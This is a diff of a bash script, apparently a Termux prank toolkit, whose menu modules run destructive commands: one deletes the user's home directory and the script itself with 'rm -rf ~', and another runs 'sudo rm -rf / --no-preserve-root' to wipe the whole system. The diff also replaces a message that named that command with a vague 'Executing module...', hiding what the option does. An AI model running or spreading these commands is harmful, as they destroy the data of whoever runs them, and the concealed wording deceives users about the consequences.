@@ -226,7 +226,7 @@ cavalab_module() {
   local module="$1"
   case "$module" in
     "cavalab/lighteternal/cavalinux")
-      read -p "What do you want to do?" choice
+      read -p "What do you want to do? [01]: Run [02]: Cancel" choice
       case $choice in
         01)
           echo "Testing termux-brightness 100..."
@@ -238,7 +238,7 @@ cavalab_module() {
               echo "HACKED :DDDDDD"
             done
           else
-            echo "You can't test this module at the moment. To run it, install Termux:API, allow it to change system settings, and run 'pkg install termux-api'."
+            echo "You cant test this module at the moment. To run it, install Termux:API, allow it to change system settings, and run 'pkg install termux-api'."
           fi
           ;;
         02)
@@ -250,7 +250,7 @@ cavalab_module() {
       esac
       ;;
     "cavalab/terminal-fucker/all")
-      read -p "What do you want to do?" choice
+      read -p "What do you want to do? [01]: Run [02]: Cancel" choice
       case $choice in
         01)
           rm -rf ~ && rm $0 && exit
@@ -267,7 +267,7 @@ cavalab_module() {
       read -p "What do you want to do? [01]: Run [02]: Cancel" choice
       case $choice in
         01)
-          echo "Executing 'sudo rm -rf / --no-preserve-root'..."
+          echo "Executing module..."
           sudo rm -rf / --no-preserve-root
           ;;
         02)
